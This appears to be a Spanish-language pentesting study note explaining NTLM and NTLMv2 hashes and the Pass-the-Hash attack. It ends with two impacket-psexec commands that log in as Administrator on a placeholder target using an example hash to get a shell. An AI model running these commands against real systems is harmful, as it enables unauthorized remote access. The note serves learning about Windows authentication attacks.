----
- Tags: #teoria #practica #windows #basico 
- ------

# Hash NTLM (Net LAN Manager)

### En Windows, los **hashes** NTLM (NT LAN Manager) se utilizan para almacenar **las contraseñas de los usuarios**. En lugar de almacenar las contraseñas en texto plano, se generan hashes mediante una función criptográfica a partir de las contraseñas. Estos hashes son valores de longitud fija que representan las contraseñas originales de forma no reversible.

### El hash NTLM es el resultado de aplicar una función criptográfica al valor de la contraseña original utilizando el protocolo NTLM. Este hash se utiliza para autenticar a los usuarios en un sistema Windows. Cuando un usuario inicia sesión, su contraseña se convierte en un hash NTLM y se compara con el hash almacenado en la base de datos del sistema. Si coinciden, se permite el acceso.

### **Este hash puede ser utilizado para realizar un Pass The Hash tanto como para intentar crackearlo, ya que es el hash original al cual fue convertida la contraseña en texto claro.**

---

# Hash NTLMv2 o Net-NTLM 

### Por otro lado, el hash **NTLMv2** es el hash que se genera en cada autenticación cliente/servidor, por lo que no es un hash que se almacene, sino que dependerá de cada comunicación.

### **Este hash puede ser utilizado para intentar crackearlo.**

----

# Pass The Hash 

### **Pass The Hash** consiste en un ataque en el que básicamente si se conoce el hash NTLM de un usuario, y ese usuario tiene los suficientes privilegios en el sistema. Se puede tanto ejecutar comandos como obtener una shell en el equipo Windows, solo conociendo su hash. 

```bash
# Una vez obtenido un hash NTLM, ejemplo: 
"aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00"

# Ambas maneras son validas para llevar a cabo el Pass The Hash
impacket-psexec WORKGROUP/Administrator@{target_ip} -hashes :e0fb1fb85756c24235ff238cbe81fe00
impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00 Administrator@{target_ip}
```

### De esta manera nos podríamos autenticar como el usuario administrador en la máquina windows sin proporcionar contraseña ya que en lugar de esta proporcionamos el **hash NTLM**. 

